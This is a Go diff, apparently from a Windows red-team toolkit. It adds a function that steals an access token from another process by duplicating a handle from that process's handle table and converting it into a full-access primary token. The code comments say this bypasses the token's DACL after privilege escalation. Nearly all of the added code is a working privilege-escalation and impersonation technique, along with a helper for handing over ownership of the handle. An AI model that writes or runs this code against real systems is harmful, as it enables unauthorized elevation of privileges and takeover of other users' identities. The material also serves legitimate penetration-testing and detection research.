@@ -132,6 +132,49 @@ func Steal(pid int) (*Token, error) {
 	return New(dupToken, Primary), nil
 }
 
+// StealViaDuplicateHandle steals a token from a remote process using the
+// DuplicateHandle technique. Unlike Steal(), this bypasses the token's own
+// DACL because it duplicates a handle from the remote process's handle table
+// rather than opening the token directly.
+//
+// Requires PROCESS_DUP_HANDLE access on hProcess (typically obtained via
+// PROCESS_ALL_ACCESS after privilege escalation).
+//
+// remoteTokenHandle is the handle value of a token inside the remote process.
+// Use ntapi.FindHandleByType to discover it via system handle enumeration.
+func StealViaDuplicateHandle(hProcess windows.Handle, remoteTokenHandle uintptr) (*Token, error) {
+	var localHandle windows.Handle
+	currentProcess, _ := windows.GetCurrentProcess()
+	err := windows.DuplicateHandle(
+		hProcess,
+		windows.Handle(remoteTokenHandle),
+		currentProcess,
+		&localHandle,
+		0,
+		false,
+		windows.DUPLICATE_SAME_ACCESS,
+	)
+	if err != nil {
+		return nil, fmt.Errorf("DuplicateHandle: %w", err)
+	}
+	defer windows.CloseHandle(localHandle)
+
+	var dupToken windows.Token
+	err = windows.DuplicateTokenEx(
+		windows.Token(localHandle),
+		windows.TOKEN_ALL_ACCESS,
+		nil,
+		windows.SecurityImpersonation,
+		windows.TokenPrimary,
+		&dupToken,
+	)
+	if err != nil {
+		return nil, fmt.Errorf("DuplicateTokenEx: %w", err)
+	}
+
+	return New(dupToken, Primary), nil
+}
+
 // StealByName finds a process by name and steals its token.
 func StealByName(processName string) (*Token, error) {
 	procs, err := enum.FindByName(processName)
@@ -150,6 +193,15 @@ func (t *Token) Token() windows.Token {
 func (t *Token) Close() {
 	windows.Close(windows.Handle(t.token))
 	t.token = 0
+}
+
+// Detach transfers ownership of the underlying token handle to the caller
+// and zeroes the internal field so Close() becomes a no-op. The caller is
+// responsible for closing the returned handle.
+func (t *Token) Detach() windows.Token {
+	h := t.token
+	t.token = 0
+	return h
 }
 
 func (t *Token) errIfTokenClosed() error {
